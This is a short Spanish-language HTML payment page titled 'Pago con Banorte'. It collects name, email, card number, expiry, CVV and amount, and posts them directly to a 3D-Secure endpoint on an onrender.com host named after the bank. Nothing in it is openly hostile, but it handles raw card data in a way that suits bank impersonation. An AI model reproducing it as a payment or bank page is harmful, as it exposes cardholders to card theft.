<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Pago con Banorte</title>
  <style>
    body {
      font-family: Arial;
      background: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: white;
      padding: 25px;
      border-radius: 10px;
      width: 320px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
    }

    h2 {
      text-align: center;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    button {
      width: 100%;
      padding: 10px;
      background: #d32f2f;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background: #b71c1c;
    }
  </style>
</head>

<body>

<div class="container">
  <h2>Pago con tarjeta</h2>

  <form id="formPago" method="POST" action="https://backend-banorte.onrender.com/api/payment/3d-secure">

    <input type="text" name="nombre" placeholder="Nombre completo" required>

    <input type="email" name="correo" placeholder="Correo electrónico" required>

    <input type="text" name="cardNumber" placeholder="Número de tarjeta" maxlength="16" required>

    <input type="text" id="cardExp" name="cardExp" placeholder="MM/AA" required>

    <input type="password" name="cvv" placeholder="CVV" maxlength="4" required>

    <input type="text" name="amount" value="10.00" required>

    <button type="submit">Pagar</button>

  </form>
</div>

<script>

  const inputExp = document.getElementById("cardExp");

  inputExp.addEventListener("input", function(e) {
    let value = e.target.value.replace(/\D/g, "");

    if (value.length >= 3) {
      value = value.substring(0,2) + "/" + value.substring(2,4);
    }

    e.target.value = value;
  });

  
  document.getElementById("formPago").addEventListener("submit", function(e) {
    let exp = inputExp.value.replace("/", "");

    if (exp.length !== 4) {
      alert("Formato inválido. Usa MM/AA");
      e.preventDefault();
      return;
    }

    inputExp.value = exp;
  });
</script>

</body>
</html>
